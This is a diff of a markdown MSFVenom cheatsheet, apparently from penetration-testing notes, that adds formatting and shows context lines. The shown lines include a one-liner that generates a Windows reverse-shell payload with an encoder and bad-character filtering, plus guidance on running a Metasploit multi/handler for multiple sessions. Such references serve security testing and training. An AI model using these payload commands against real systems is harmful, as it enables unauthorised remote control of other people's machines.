@@ -1,11 +1,15 @@
-# MSFVenom
+# MSFVenom-Cheatsheet
 
 ## MSFVenom Cheatsheet
+
+***
 
 Single Page Cheatsheet for common MSF Venom One Liners\
 Available in PDF, DOCX and Markdown format!_PDF and DOCX versions contain the payload size in bytes and a few more commands._
 
 ## MSFVenom Cheatsheet
+
+***
 
 | MSFVenom Payload Generation One-Liner                                                                                                                                                                                     | Description                                     |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
@@ -37,6 +41,8 @@ Available in PDF, DOCX and Markdown format!_PDF and DOCX versions contain the pa
 | msfvenom -p windows/shell\_reverse\_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv\_mov -b "\x04\xA0"                                                                                                       | Bad characters fnstenv\_mov                     |
 
 ## Multihandler Listener
+
+***
 
 To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse\_tcp payload,
 
